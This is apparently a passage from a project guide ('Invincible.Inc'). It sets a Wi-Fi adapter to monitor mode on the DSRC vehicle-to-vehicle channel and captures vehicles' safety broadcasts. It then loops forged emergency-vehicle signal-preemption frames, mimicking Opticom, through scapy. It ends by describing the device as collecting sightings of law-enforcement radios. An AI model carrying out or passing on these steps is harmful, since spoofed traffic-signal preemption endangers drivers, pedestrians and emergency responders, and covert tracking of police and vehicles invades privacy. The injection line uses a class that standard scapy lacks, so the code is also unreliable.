(Or one-shot from Windows admin PowerShell: `cd C:\Users\eckel\Documents\Invincible.Inc\Omni-repo; .\scripts\Start-Alfa.ps1`.)

**Step 1 — Prepare the Interface:**

> **Requires the 9-patch DSRC unlock** (Prereq 1 above, or Section 01 PREREQUISITE).
> Ch 172 is registered directly in the driver's cfg80211 channel table and regulatory
> domain — no country-code workarounds needed. `iw reg set BO` is obsolete and has no
> effect with this driver build.

```bash
# Drop to managed, set monitor, bring up
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Tune to DSRC control channel — Ch 172 / 5.860 GHz
sudo iw dev wlan0 set channel 172

# Verify
iw dev wlan0 info
# Expected: channel 172 (5860 MHz), width: 20 MHz, center1: 5860 MHz
```

**Step 2 — Passive BSM Capture (Monitor Mode):**

With ch172 in monitor mode the adapter receives all V2X Basic Safety Messages (BSMs) and
WAVE Short Messages (WSMs) broadcast by equipped vehicles and RSUs in the vicinity.

```bash
# Capture all frames on ch172 to pcap for offline analysis
sudo tcpdump -i wlan0 -w /tmp/dsrc_$(date +%s).pcap

# Or pipe live through tshark for real-time decode
sudo tshark -i wlan0 -l
```

**Step 3 — Inject Priority Request (EVP Trigger):**

```bash
sudo python3 -c "from scapy.all import *; sendp(RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff')/V2X_EVP_TRIGGER(), iface='wlan0', loop=1, inter=0.1)"
```

> Mimics an Opticom/GTT 5.8 GHz DSRC broadcast using raw frame injection.

---

## MISSION STATUS: CORRIDOR DOMINANCE

Once commissioned, the device is a **Mesh Intelligence Node**. It passively exfiltrates LEA MAC sightings and V2X Basic Safety Messages (BSMs) to your Arion HUD — absolute situational dominance.

**Invincible.Inc: Technical Supremacy via Kinetic Logic.**
